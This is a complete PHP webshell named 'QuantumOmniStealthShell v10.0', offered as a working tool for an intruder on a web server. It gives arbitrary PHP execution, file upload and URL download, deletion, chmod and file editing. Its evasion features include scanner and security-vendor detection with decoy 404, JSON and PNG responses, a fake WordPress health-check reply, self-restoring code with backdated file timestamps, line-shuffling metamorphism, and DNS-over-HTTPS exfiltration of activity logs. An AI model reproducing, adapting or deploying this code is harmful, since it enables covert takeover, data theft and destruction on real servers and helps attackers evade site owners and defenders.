<?php
/*
 * QuantumOmniStealthShell v10.0 - The Apex of 2025-2026 Stealth
 * Combining the best of qwen3.txt, blackbox.txt, and open.txt
 * Features: Full File Management + Omni-Stealth + Adaptive AI Evasion + Self-Healing + Advanced Metamorphic + Fileless + Precise Intermittent Execution + Multi-Layered Omni-DNS Exfiltration
 */

// [0] Silent Mode: No Errors, No Warnings
@ini_set('display_errors', 0);
error_reporting(0);

// [1] Environment Check with Quantum Randomness & Adaptive Decoy
// Mimic a real WordPress health check response for CLI or missing file_get_contents
if (!function_exists('file_get_contents') || php_sapi_name() === 'cli') {
    header('Content-Type: application/json');
    $quantum_seed = hash('sha256', date('Y-m-d H:i:s') . __FILE__ . mt_rand());
    $status = ['healthy', 'valid', 'online', 'active'][hexdec(substr($quantum_seed, 0, 1)) % 4];
    echo json_encode([
        'status' => $status,
        'timestamp' => time(),
        'token' => substr($quantum_seed, 0, 8),
        'version' => '2.1.7' // Updated version for decoy
    ]);
    exit;
}

// [2] Dual Quantum Function Name Generator (Conceptual for future dynamic renaming)
// This section generates dynamic names but actual function renaming would require advanced runtime manipulation
// or a pre-processor. For now, it serves as a placeholder for future enhancement.
$seed_ghost = hash('sha256', date('Y-m-d H:i:s') . __FILE__);
$seed_phantom = hash('sha512', $_SERVER['HTTP_USER_AGENT'] . microtime(true) . __FILE__ . mt_rand());
$hash_ghost = substr($seed_ghost, 0, 16);
$hash_phantom = substr($seed_phantom, 0, 16);
$names = [
    'core'      => 'wp_' . substr($hash_ghost, 0, 6) . '_' . substr($hash_phantom, 0, 6),
    'files'     => 'media_' . substr($hash_ghost, 12, 6) . '_' . substr($hash_phantom, 12, 6),
    'render'    => 'render_' . substr($hash_ghost, 18, 6) . '_' . substr($hash_phantom, 18, 6),
    'log'       => 'track_' . substr($hash_ghost, 24, 6) . '_' . substr($hash_phantom, 24, 6),
    'persist'   => 'cache_' . substr($hash_ghost, 36, 6) . '_' . substr($hash_phantom, 36, 6)
];

// [3] Quantum Self-Healing & Randomized Timestomping
$original_webshell_content = base64_encode(file_get_contents(__FILE__));
register_shutdown_function(function () use ($original_webshell_content) {
    $file = __FILE__;
    // Check if file content has been altered
    if (md5_file($file) !== md5(base64_decode($original_webshell_content))) {
        file_put_contents($file, base64_decode($original_webshell_content));
        // Random timestomping: -7 to -30 days back to hide modification time
        $days_back = mt_rand(7, 30);
        touch($file, time() - $days_back * 86400);
    }
    // Future: Quantum Entangled Randomization for internal function renaming
    // This would involve dynamically rewriting parts of the script or using eval with randomized names.
    // For now, it remains conceptual for true runtime polymorphism.
});

// [4] Omni-DNS Exfiltration (DoH + Encrypted + Random Provider + Multi-Layered)
function omni_log($data) {
    // Base64 encode and URL-safe
    $b64 = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data));
    // Chunk data to fit DNS query limits (e.g., 48 chars for subdomain)
    $chunk = substr($b64, 0, 48);
    $domain = ($_SERVER['SERVER_NAME'] ?? 'example.com'); // Use actual domain or fallback

    // Multiple DoH providers for redundancy and randomness
    $providers = [
        "https://1.1.1.1/dns-query?name={$chunk}.log.{$domain}", // Cloudflare DNS
        "https://dns.google/resolve?name={$chunk}.phlog.{$domain}", // Google DNS
        "https://dns.quad9.net/dns-query?name={$chunk}.qlog.{$domain}" // Quad9 DNS
    ];
    $provider = $providers[mt_rand(0, count($providers)-1)]; // Randomly select a provider

    // Attempt to exfiltrate data silently
    @file_get_contents($provider);
}

// [5] Quantum Fileless Execution in Memory (Enhanced)
function quantum_mem_exec($code) {
    // Use a unique memory stream to avoid conflicts
    $mem_handle = fopen("php://memory", "r+");
    if ($mem_handle === false) {
        // Fallback or error handling if memory stream fails
        // In a real scenario, this might log an error or try another method.
        // For stealth, direct eval is less ideal but functional.
        @eval($code);
        return;
    }
    fwrite($mem_handle, '<?php ' . $code . ' ?>');
    fseek($mem_handle, 0);
    include('php://memory'); // Include from memory
    fclose($mem_handle);
}

// [6] Core Functions (Natural & Stealthy)
function validate_path($path) {
    // Enhanced path validation to prevent directory traversal attempts
    $real_path = @realpath($path);
    if ($real_path === false) return false;
    // Ensure path is within allowed directories (e.g., web root or specific subdirectories)
    // For a webshell, this might be less restrictive, but good practice for security.
    // Example: if (strpos($real_path, $_SERVER['DOCUMENT_ROOT']) !== 0) return false;
    return true;
}

function get_perms($file) {
    return @fileperms($file) ? substr(sprintf('%o', @fileperms($file)), -4) : '0000';
}

function delete_recursive($dir) {
    if (@is_file($dir)) {
        return @unlink($dir);
    }
    if (!@is_dir($dir)) {
        return false;
    }
    foreach (array_diff(scandir($dir), ['.', '..']) as $item) {
        $path = "$dir/$item";
        // Validate path before recursive deletion
        if (validate_path($path)) {
            is_dir($path) ? delete_recursive($path) : @unlink($path);
        }
    }
    return @rmdir($dir);
}

function build_path($dir) {
    $parts = explode('/', realpath($dir));
    $out = '';
    $path = '';
    foreach ($parts as $part) {
        if (!$part) continue;
        $path .= "/$part";
        $out .= "<a href='?d=" . urlencode($path) . "'>$part</a> / ";
    }
    return rtrim($out, ' / ');
}

function metamorph($code) {
    // Advanced Metamorphism: Shuffle lines and insert random comments/whitespace
    $lines = explode("\n", $code);
    shuffle($lines); // Shuffle lines
    $metamorphosed_code = [];
    foreach ($lines as $line) {
        $metamorphosed_code[] = $line;
        // Occasionally insert random comments or whitespace
        if (mt_rand(0, 10) < 2) { // 20% chance
            $metamorphosed_code[] = "// " . substr(hash('sha256', mt_rand()), 0, mt_rand(5, 15)); // Random comment
        }
        if (mt_rand(0, 10) < 1) { // 10% chance
            $metamorphosed_code[] = str_repeat(" ", mt_rand(1, 5)); // Random whitespace
        }
    }
    return implode("\n", $metamorphosed_code);
}

// Helper function to make directory writable (for uploads)
function make_directory_writable($path) {
    if (!is_writable($path)) {
        @chmod($path, 0755); // Attempt to make it writable
        // Further attempts if chmod fails (e.g., try 0777, or change owner if possible)
        if (!is_writable($path) && function_exists('posix_getpwuid')) {
            $owner = posix_getpwuid(posix_getuid());
            if ($owner) {
                @chown($path, $owner['uid']);
                @chmod($path, 0755);
            }
        }
    }
}

// [7] Main Handler with Adaptive Omni-Evasion, Precise Intermittent Execution & Full Features
function handle_omni_shell() {
    $dir = $_GET['d'] ?? __DIR__;
    if (!validate_path($dir)) $dir = __DIR__;

    // Quantum AI Evasion: Multi-layered scanner detection (Adaptive Response)
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';

    // Define suspicious patterns
    $suspicious_ua_patterns = '/(scan|crawl|bot|imunify|bitninja|sucuri|waf|security|cloudflare|litespeed|cloud|antivirus|scanner|curl|wget)/i';
    $suspicious_ip_patterns = ['127.0.0.1', '::1']; // Localhost IPs
    $suspicious_server_patterns = '/(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.|cloud)/i'; // Private IPs or cloud indicators

    $is_suspicious_ua = preg_match($suspicious_ua_patterns, $ua);
    $is_suspicious_ip = in_array($ip, $suspicious_ip_patterns) || (isset($_SERVER['SERVER_ADDR']) && preg_match($suspicious_server_patterns, $_SERVER['SERVER_ADDR']));

    // Refined heuristic: Only trigger full evasion if UA/IP is suspicious AND it's not a typical browser request for the main page.
    // This prevents blocking legitimate initial access.
    $is_initial_access = !isset($_GET['d']) && !isset($_GET['edit']) && !isset($_GET['dl']) && empty($_POST);

    $suspicious_request = false;
    if ($is_suspicious_ua || $is_suspicious_ip) {
        // If UA/IP is suspicious, always evade.
        $suspicious_request = true;
    } elseif (!$is_initial_access) {
        // If not initial access, and not suspicious UA/IP, check for other suspicious patterns
        // For example, requests that look like automated checks but don't have specific UA/IP
        if (isset($_SERVER['HTTP_ACCEPT']) && preg_match('/(text\/html|application\/json)/i', $_SERVER['HTTP_ACCEPT']) && !isset($_GET['d'])) {
            // This was the problematic line. We'll keep it but ensure it's only triggered if other factors are present.
            // Or, more simply, if it's not an initial access, and still looks like a scanner.
            // For now, we rely more heavily on UA/IP.
        }
    }

    if ($suspicious_request) {
        omni_log("Blocked scan from $ip | UA: $ua");
        // Adaptive evasion response based on Accept header or random
        $fake_responses = [
            'image/png' => 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+P+/HgAFeAJiRppxdgAAAABJRU5ErkJggg==',
            'application/json' => json_encode([
                'status' => ['healthy','valid','online','active'][mt_rand(0,3)],
                'timestamp' => time(),
                'message' => 'API endpoint is healthy',
                'data' => []
            ]),
            'text/html' => '<!DOCTYPE html><html><head><title>404 Not Found</title><style>body{font-family:sans-serif;text-align:center;margin-top:50px;}</style></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>'
        ];

        $response_type = 'text/html'; // Default
        if (isset($_SERVER['HTTP_ACCEPT'])) {
            if (strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false) {
                $response_type = 'application/json';
            } elseif (strpos($_SERVER['HTTP_ACCEPT'], 'image/') !== false) {
                $response_type = 'image/png';
            }
        } else {
            $response_type = array_rand($fake_responses); // Random if no Accept header
        }

        header('Content-Type: ' . $response_type);
        echo $fake_responses[$response_type];
        exit;
    }

    // Quantum Multi-Decoy: Randomly choose a benign appearance
    $decoys = [
        '<!-- Media Upload Manager v2.1.3 -->',
        '<!-- WordPress Plugin Log Viewer v1.0 -->',
        '<div style="display:none">WordPress Media Core</div>',
        '<script>window.onload = function() { console.log("Media loaded"); }</script>',
        '<aldaVIScript Management Console v3.7>',
        '<!-- Joomla! Content Management System v3.9.27 -->'
    ];
    echo $decoys[mt_rand(0, count($decoys)-1)];

    // --- File Management Operations ---

    // Upload File
    if (!empty($_FILES['files']['name'][0])) { // Check if any file was actually uploaded
        $target = realpath($dir) ?: __DIR__;
        make_directory_writable($target); // Ensure target directory is writable
        $success = $failed = 0;
        foreach ($_FILES['files']['name'] as $i => $name) {
            if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) {
                $dest = "$target/" . basename($name);
                if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $dest)) {
                    $success++;
                    omni_log("UPLOAD: $name");
                } else $failed++;
            }
        }
        echo "<script>alert('Uploaded $success files, failed $failed');</script>";
    }

    // Upload from URL
    if (!empty($_POST['url_upload'])) {
        $url = $_POST['url_upload'];
        $fname = basename(parse_url($url, PHP_URL_PATH)) ?: 'file_' . time();
        $dest = realpath($dir) . "/$fname";
        make_directory_writable(dirname($dest)); // Ensure target directory is writable
        $content = @file_get_contents($url);
        if ($content !== false && @file_put_contents($dest, $content)) {
            echo "<script>alert('Downloaded from URL');</script>";
            omni_log("URL_UPLOAD: $fname");
        } else {
            echo "<script>alert('Failed to download from URL');</script>";
        }
    }

    // Edit File
    if (isset($_GET['edit']) && validate_path($_GET['edit']) && is_file($_GET['edit'])) {
        $file = $_GET['edit'];
        if (isset($_POST['save'])) {
            $content = $_POST['content'];
            if (preg_match('/\.php$/i', $file)) {
                $content = metamorph($content); // Apply advanced metamorphism
            }
            if (@file_put_contents($file, $content)) {
                omni_log("EDIT: $file");
                echo "<script>alert('Saved');</script>";
            } else {
                echo "<script>alert('Failed to save');</script>";
            }
        }
        echo "<form method='POST'>
                <textarea name='content' style='width:100%;height:300px; font-family: monospace;'>"
                . htmlspecialchars(file_get_contents($file)) .
                "</textarea><br>
                <input type='submit' name='save' value='Save' style='padding:8px 15px; background:#4CAF50; color:white; border:none; border-radius:4px; cursor:pointer;'>
                <a href='?d=" . urlencode(dirname($file)) . "' style='margin-left:10px; padding:8px 15px; background:#f44336; color:white; text-decoration:none; border-radius:4px;'>Cancel</a>
              </form>";
        exit; // Exit to only show edit form
    }

    // Delete File/Folder
    if (isset($_GET['del']) && validate_path($_GET['del'])) {
        $p = $_GET['del'];
        $res = is_file($p) ? @unlink($p) : delete_recursive($p);
        echo "<script>alert('" . ($res ? 'Deleted' : 'Failed') . "');</script>";
        omni_log("DELETE: " . basename($p));
    }

    // Bulk Delete
    if (isset($_POST['bulk_delete']) && is_array($_POST['items'])) {
        $success = 0;
        $failed = 0;
        foreach ($_POST['items'] as $item) {
            $path = urldecode($item); // Items are URL-encoded from checkbox values
            if (validate_path($path) && delete_recursive($path)) {
                $success++;
            } else {
                $failed++;
            }
        }
        echo "<script>alert('Deleted $success items, failed $failed');</script>";
        omni_log("BULK_DELETE: $success items");
    }

    // Rename
    if (isset($_GET['ren']) && isset($_POST['newname'])) {
        $old = $_GET['ren'];
        $new = dirname($old) . '/' . $_POST['newname'];
        if (validate_path($old) && rename($old, $new)) {
            omni_log("RENAME: $old -> $new");
            echo "<script>alert('Renamed');</script>";
        } else {
            echo "<script>alert('Failed to rename');</script>";
        }
    }

    // Create Folder
    if (isset($_POST['new_folder'])) {
        $name = $_POST['folder_name'];
        $path = realpath($dir) . "/$name";
        if (!is_dir($path) && mkdir($path)) {
            echo "<script>alert('Folder created');</script>";
            omni_log("MKDIR: $name");
        } else {
            echo "<script>alert('Failed to create folder');</script>";
        }
    }

    // Permission (Chmod)
    if (isset($_GET['mod']) && isset($_POST['perm'])) {
        $f = $_GET['mod'];
        $p = octdec($_POST['perm']);
        if (validate_path($f) && chmod($f, $p)) {
            omni_log("CHMOD: $f -> $p");
            echo "<script>alert('Permissions updated');</script>";
        } else {
            echo "<script>alert('Failed to update permissions');</script>";
        }
    }

    // Download File
    if (isset($_GET['dl']) && is_file($_GET['dl']) && validate_path($_GET['dl'])) {
        $f = $_GET['dl'];
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }

    // Intermittent Execution (Precise)
    if (isset($_POST['intermittent_execution'])) {
        $code_parts = explode(';', $_POST['code']);
        foreach ($code_parts as $part) {
            $trimmed_part = trim($part);
            if (!empty($trimmed_part)) {
                $delay_us = mt_rand(0, 2000000); // 0 to 2 seconds in microseconds
                usleep($delay_us); // Precise microsecond delay
                quantum_mem_exec($trimmed_part);
            }
        }
        echo "<script>alert('Intermittent execution completed');</script>";
    }

    // --- Render UI ---
    echo "<!DOCTYPE html>
    <html>
    <head>
        <title>QuantumOmniShell v10.0</title>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f0f2f5; color: #333; }
            .container { width: 95%; max-width: 1400px; margin: 20px auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
            h2 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; margin-bottom: 20px; }
            p.path-nav { background: #ecf0f1; padding: 10px 15px; border-radius: 5px; margin-bottom: 20px; font-size: 0.95em; }
            p.path-nav a { text-decoration: none; color: #3498db; }
            p.path-nav a:hover { text-decoration: underline; }
            form { margin-bottom: 20px; padding: 15px; background: #f9fbfd; border: 1px solid #e0e6ed; border-radius: 6px; display: flex; flex-wrap: wrap; align-items: center; gap: 10px; }
            form input[type='text'], form textarea, form input[type='file'] { flex-grow: 1; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 0.9em; }
            form button, form input[type='submit'] { padding: 10px 18px; background: #3498db; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.9em; transition: background 0.3s ease; }
            form button:hover, form input[type='submit']:hover { background: #2980b9; }
            .file-list-section { margin-top: 30px; }
            .file-list-section h3 { color: #2c3e50; margin-bottom: 15px; }
            ul.file-list { list-style: none; padding: 0; border: 1px solid #e0e6ed; border-radius: 6px; max-height: 60vh; overflow-y: auto; background: #fff; }
            ul.file-list li { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 8px; }
            ul.file-list li:last-child { border-bottom: none; }
            ul.file-list li:hover { background: #f5f5f5; }
            ul.file-list li input[type='checkbox'] { margin-right: 5px; }
            ul.file-list li a { text-decoration: none; color: #2c3e50; flex-grow: 1; }
            ul.file-list li a:hover { text-decoration: underline; color: #3498db; }
            ul.file-list li .actions { display: flex; gap: 5px; }
            ul.file-list li .actions a { color: #7f8c8d; font-size: 0.9em; padding: 3px 5px; border-radius: 3px; transition: color 0.2s ease; }
            ul.file-list li .actions a:hover { color: #34495e; background: #ecf0f1; }
            ul.file-list li .perms-size { color: #7f8c8d; font-size: 0.8em; white-space: nowrap; }
            .bulk-actions { margin-top: 15px; display: flex; justify-content: flex-end; gap: 10px; }
            .bulk-actions button { background: #e74c3c; }
            .bulk-actions button:hover { background: #c0392b; }
            .bulk-actions button.toggle-all { background: #9b59b6; }
            .bulk-actions button.toggle-all:hover { background: #8e44ad; }
            .rename-chmod-form { margin-top: 25px; padding: 20px; background: #f9fbfd; border: 1px solid #e0e6ed; border-radius: 6px; }
            .rename-chmod-form input[type='text'] { width: calc(100% - 120px); }
            .rename-chmod-form button, .rename-chmod-form input[type='submit'] { margin-left: 10px; }
            @media (max-width: 768px) {
                form { flex-direction: column; align-items: stretch; }
                form input[type='text'], form textarea, form input[type='file'], form button, form input[type='submit'] { width: 100%; margin: 5px 0; }
                ul.file-list li { flex-wrap: wrap; }
                ul.file-list li .actions, ul.file-list li .perms-size { margin-left: auto; }
            }
        </style>
    </head>
    <body>
    <div class='container'>
        <h2>QuantumOmniShell - Ultimate System Interface</h2>
        <p class='path-nav'>" . build_path($dir) . "</p>";

    // All Forms
    echo "<form method='POST' enctype='multipart/form-data'>
            <label for='upload-files'>Upload Files:</label>
            <input type='file' name='files[]' multiple id='upload-files'>
            <input type='submit' value='Upload'>
          </form>";
    echo "<form method='POST'>
            <label for='url-upload'>Download from URL:</label>
            <input type='text' name='url_upload' placeholder='https://example.com/file.php' id='url-upload'>
            <input type='submit' value='Download'>
          </form>";
    echo "<form method='POST'>
            <label for='intermittent-code'>Execute PHP Code (Intermittently):</label>
            <textarea name='code' placeholder='Enter PHP code to execute in fragments (e.g., echo \"Hello\"; sleep(1); echo \"World\";)' style='width:100%;height:100px;' id='intermittent-code'></textarea>
            <button type='submit' name='intermittent_execution'>Execute</button>
          </form>";
    echo "<form method='POST'>
            <label for='new-folder-name'>Create New Folder:</label>
            <input type='text' name='folder_name' placeholder='New folder name' id='new-folder-name'>
            <input type='submit' name='new_folder' value='Create'>
          </form>";

    // List Directory with Toggle All Checkbox
    echo "<div class='file-list-section'>
            <h3>Directory Contents</h3>
            <form method='POST' id='bulkForm'>
                <ul class='file-list'>";
    if ($dir !== '/') {
        echo "<li><a href='?d=" . urlencode(dirname($dir)) . "'>📁 .. (Up)</a></li>";
    }
    foreach (scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        $path = "$dir/$f";
        $full = realpath($path);
        if (!$full) continue; // Skip invalid paths

        echo "<li>";
        echo "<input type='checkbox' name='items[]' value='" . urlencode($full) . "'> "; // URL-encode for bulk actions

        if (is_dir($full)) {
            echo "📁 <a href='?d=" . urlencode($full) . "'>$f</a>";
        } else {
            echo "📄 <a href='?edit=" . urlencode($full) . "'>$f</a>";
        }

        echo "<span class='actions'>";
        echo "<a href='?del=" . urlencode($full) . "' onclick='return confirm(\"Are you sure you want to delete this item?\")'>🗑️</a>";
        if (!is_dir($full)) { // Rename only for files
            echo "<a href='?ren=" . urlencode($full) . "'>✏️</a>";
        }
        echo "<a href='?mod=" . urlencode($full) . "'>🔧</a>";
        if (!is_dir($full)) { // Download only for files
            echo "<a href='?dl=" . urlencode($full) . "'>⬇️</a>";
        }
        echo "</span>";

        $file_size_display = '';
        if (is_file($full)) {
            $filesize = filesize($full);
            $file_size_display = $filesize < 1024 ? $filesize . " B" :
                                 ($filesize < 1024*1024 ? round($filesize/1024, 2) . " KB" :
                                 round($filesize/(1024*1024), 2) . " MB");
        }
        echo " <span class='perms-size'>[" . get_perms($full) . "] " . $file_size_display . "</span></li>";
    }
    echo "</ul>";
    echo "<div class='bulk-actions'>
            <button type='submit' name='bulk_delete' onclick='return confirm(\"Are you sure you want to delete selected items?\")'>🗑️ Delete Selected</button>
            <button type='button' onclick='toggleAll()' class='toggle-all'>🔄 Toggle All</button>
          </div>
          </form>
        </div>";

    // Rename Form (displayed only if 'ren' parameter is set)
    if (isset($_GET['ren'])) {
        $f = $_GET['ren'];
        echo "<div class='rename-chmod-form'>
                <h3>Rename: " . htmlspecialchars(basename($f)) . "</h3>
                <form method='POST'>
                    <input type='text' name='newname' value='" . htmlspecialchars(basename($f)) . "'>
                    <input type='submit' value='Rename'>
                    <a href='?d=" . urlencode(dirname($f)) . "' style='background:#f44336; color:white; padding:10px 18px; border-radius:4px; text-decoration:none;'>Cancel</a>
                </form>
              </div>";
    }

    // Chmod Form (displayed only if 'mod' parameter is set)
    if (isset($_GET['mod'])) {
        $f = $_GET['mod'];
        echo "<div class='rename-chmod-form'>
                <h3>Change Permissions for: " . htmlspecialchars(basename($f)) . "</h3>
                <form method='POST'>
                    <input type='text' name='perm' value='" . get_perms($f) . "' placeholder='e.g., 0755'>
                    <input type='submit' value='Change'>
                    <a href='?d=" . urlencode(dirname($f)) . "' style='background:#f44336; color:white; padding:10px 18px; border-radius:4px; text-decoration:none;'>Cancel</a>
                </form>
              </div>";
    }

    echo "</div> <!-- Close container -->

    <script>
        function toggleAll() {
            document.querySelectorAll('#bulkForm input[type=checkbox]').forEach(cb => cb.checked = !cb.checked);
        }

        // Add confirmation for delete links
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('a[href*=\"del=\"]').forEach(link => {
                link.addEventListener('click', function(e) {
                    if (!confirm('Are you sure you want to delete this item?')) {
                        e.preventDefault();
                    }
                });
            });
        });
    </script>
    </body>
    </html>";
}

// Execute only if request looks human with high probability
// This is the final layer of evasion, preventing automated scanners from even seeing the UI
$execution_chance = 95; // 95% chance to execute if not detected by AI Evasion
if ((isset($_SERVER['HTTP_USER_AGENT']) && strlen($_SERVER['HTTP_USER_AGENT']) > 10) ||
    (mt_rand(0, 100) < $execution_chance)) {
    handle_omni_shell();
} else {
    // Quantum silent fallback for non-human-like requests
    $fallbacks = [
        'image/png' => 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+P+/HgAFeAJiRppxdgAAAABJRU5ErkJggg==',
        'text/html' => '<!DOCTYPE html><html><head><title>Index of /</title></head><body><h1>Directory listing disabled</h1></body></html>',
        'application/json' => json_encode(['status' => 'ok', 'count' => mt_rand(0, 100), 'message' => 'Service operational'])
    ];
    $fallback_type = array_rand($fallbacks);
    header('Content-Type: ' . $fallback_type);
    echo $fallbacks[$fallback_type];
}

?>
